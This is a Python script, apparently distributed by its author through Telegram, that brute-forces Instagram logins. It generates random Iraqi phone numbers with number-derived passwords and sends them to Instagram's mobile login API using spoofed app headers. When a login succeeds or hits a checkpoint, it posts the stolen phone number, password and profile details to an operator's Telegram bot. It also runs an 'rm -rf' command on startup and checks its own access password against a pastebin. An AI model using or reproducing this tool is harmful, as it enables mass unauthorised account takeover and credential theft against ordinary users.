try:
    import os, sys, random, requests, time, json, secrets, uuid
    import subprocess
    from bs4 import BeautifulSoup
    from colorama import Fore as fore
    from secrets import token_hex
    from uuid import uuid4
    from time import sleep
    os.system("rm -rf sa7")

except ImportError as e:
    sys.exit('[Error] ' + e + ' :-\\')


logo = '''
  ██▀███     ▓█████     ██▓        ▄▄▄         ▒██   ██▒
 ▓██ ▒ ██▒   ▓█   ▀    ▓██▒       ▒████▄       ▒▒ █ █ ▒░
 ▓██ ░▄█ ▒   ▒███      ▒██░       ▒██  ▀█▄     ░░  █   ░
 ▒██▀▀█▄     ▒▓█  ▄    ▒██░       ░██▄▄▄▄██     ░ █ █ ▒ 
 ░██▓ ▒██▒   ░▒████▒   ░██████▒    ▓█   ▓██▒   ▒██▒ ▒██▒
 ░ ▒▓ ░▒▓░   ░░ ▒░ ░   ░ ▒░▓  ░    ▒▒   ▓▒█░   ▒▒ ░ ░▓ ░
   ░▒ ░ ▒░    ░ ░  ░   ░ ░ ▒  ░     ▒   ▒▒ ░   ░░   ░▒ ░
   ░░   ░       ░        ░ ░        ░   ▒       ░    ░  
    ░           ░  ░       ░  ░         ░  ░    ░    ░  
                                                       
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 |  Author    >>  Qanas
 |  Github    >>  Sa7r
 |  Telegram  >>  qan4s
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
logo2 = '''
  ██▀███     ▓█████     ██▓        ▄▄▄         ▒██   ██▒
 ▓██ ▒ ██▒   ▓█   ▀    ▓██▒       ▒████▄       ▒▒ █ █ ▒░
 ▓██ ░▄█ ▒   ▒███      ▒██░       ▒██  ▀█▄     ░░  █   ░
 ▒██▀▀█▄     ▒▓█  ▄    ▒██░       ░██▄▄▄▄██     ░ █ █ ▒ 
 ░██▓ ▒██▒   ░▒████▒   ░██████▒    ▓█   ▓██▒   ▒██▒ ▒██▒
 ░ ▒▓ ░▒▓░   ░░ ▒░ ░   ░ ▒░▓  ░    ▒▒   ▓▒█░   ▒▒ ░ ░▓ ░
   ░▒ ░ ▒░    ░ ░  ░   ░ ░ ▒  ░     ▒   ▒▒ ░   ░░   ░▒ ░
   ░░   ░       ░        ░ ░        ░   ▒       ░    ░  
    ░           ░  ░       ░  ░         ░  ░    ░    ░  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 |  Author    >>  Qanas
 |  Github    >>  Sa7r
 |  Telegram  >>  qan4s
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 |  Hamu Shtek Agaretawa Bo >> BOT TELEGRAM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''

def aa(s):
    for ss in s + '\n':
        sys.stdout.write(ss)
        sys.stdout.flush()
        sleep(50. / 700)

def log():
    os.system("clear")
    re = requests.get('https://pastebin.com/raw/KF4qk5zi')
    print(logo)
    print(" Bo Daxl Bun >> SCRIPT << Password Leda ")
    print(' Bo Zanini Password Nama Bnern @qan4s')
    print('\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
    password = input(' Password Bnusa Dldl  : ')
    if password == "":
        sys.exit()
    if password in str(re.text):
        print(" Tawawa Sherhakam")
    else:
        print(" Password Hallaya ")
        os.system('xdg-open https://t.me/qan4s')
        sys.exit()
    os.system('clear')

def qanasm(username, pas):
    global token, ID, Email

    content = requests.get('https://www.instagram.com/' + username, headers={'User-agent': 'your bot 0.1'}).text
    source = BeautifulSoup(content, 'html.parser')
    description = source.find("meta", {"property": "og:description"}).get("content")
    info_list = description.split("-")[0]
    followers = info_list[0:info_list.index("Followers")]
    info_list = info_list.replace(followers + "Followers, ", "")
    following = info_list[0:info_list.index("Following")]
    info_list = info_list.replace(following + "Following, ", "")
    posts = info_list[0:info_list.index("Posts")]
    sleep(1)
    requests.post("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + ID + "&text=⁦⌯  Hi Qanas Coder 💯 ⌯\n — — — — —  — — — — — . \n.✥. NUMBER  :" + Email + "\n.✥. Pass  : " + pas + "\n.✥. User  : " + username + "\n.✥. Follwers : " + followers + "\n.✥. Foolowing : " + following + "\n.✥. Post : " + posts + "\n— — — — —  — — — — —\n• Tele : @qan4s .")


def main():
    log()
    os.system('clear')
    new = "0987654321"
    tt = time.asctime()
    r = requests.session()
    global IRAQ, token, ID, Email, start_msg, id_msg, Ok, Cp, Sk, pas, username
    print(logo2)
    ID = input('[*] ID TELEGRAM  : ')
    token = input('[*] TOKEN TELEGRAM  : ')
    start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=START HACK...🔥").json()
    id_msg = (start_msg['result']["message_id"])
    os.system('clear')

    Ok = 0
    Cp = 0
    Sk = 0

    while True:
        print(logo2)
        user = str(''.join((random.choice(new) for i in range(7))))
        q = '+964'
        x = '770'
        Email = q + x + user
        pas = "0" + x + user
        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Host': 'i.instagram.com',
            'Connection': 'keep-alive'
        }

        uid = uuid.uuid4()
        payload = {
            'uuid': uid,
            'password': pas,
            'username': Email,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        req = r.post(url, headers=headers, data=payload)
        if 'logged_in_user' in req.json():
            Ok += 1
            username = req.json()['logged_in_user']['username']
            qanasm(username, pas)

        elif '"message":"challenge_required","challenge"' in req.json():
            Cp += 1
            r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
        else:
            Sk += 1
            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
            os.system("clear")
            
            print(logo2)
            user = str(''.join((random.choice(new) for i in range(7))))
            q = '+964'
            x = '771'
            Email = q + x + user
            pas = "0" + x + user
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US",
                "X-IG-Capabilities": "3brTvw==",
                "X-IG-Connection-Type": "WIFI",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }

            uid = uuid.uuid4()
            payload = {
                'uuid': uid,
                'password': pas,
                'username': Email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            req = r.post(url, headers=headers, data=payload)
            if 'logged_in_user' in req.json():
                Ok += 1
                username = req.json()['logged_in_user']['username']
                qanasm(username, pas)
            elif '"message":"challenge_required","challenge"' in req.json():
                Cp += 1
                r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
            else:
                Sk += 1
                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
                os.system("clear")
                
                print(logo2)
                user = str(''.join((random.choice(new) for i in range(7))))
            q = '+964'
            x = '750'
            Email = q + x + user
            pas = "0" + x + user
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US",
                "X-IG-Capabilities": "3brTvw==",
                "X-IG-Connection-Type": "WIFI",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }

            uid = uuid.uuid4()
            payload = {
                'uuid': uid,
                'password': pas,
                'username': Email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            req = r.post(url, headers=headers, data=payload)
            if 'logged_in_user' in req.json():
                Ok += 1
                username = req.json()['logged_in_user']['username']
                qanasm(username, pas)
            elif '"message":"challenge_required","challenge"' in req.json():
                Cp += 1
                r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
            else:
                Sk += 1
                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
                os.system("clear")
                
                user = str(''.join((random.choice(new) for i in range(7))))
            q = '+964'
            x = '751'
            Email = q + x + user
            pas = "0" + x + user
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US",
                "X-IG-Capabilities": "3brTvw==",
                "X-IG-Connection-Type": "WIFI",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }

            uid = uuid.uuid4()
            payload = {
                'uuid': uid,
                'password': pas,
                'username': Email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            req = r.post(url, headers=headers, data=payload)
            if 'logged_in_user' in req.json():
                Ok += 1
                username = req.json()['logged_in_user']['username']
                qanasm(username, pas)
            elif '"message":"challenge_required","challenge"' in req.json():
                Cp += 1
                r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. Number  : {Email}\n\n.✥. Pass  : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
            else:
                Sk += 1
                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER  : [ → {Email} ← ]\n\n.✥. PASS  : [ → {pas} ← ]\n-----------------------------------------\n.✥.TELEGRAM : @qan4s")
                os.system("clear")




main()

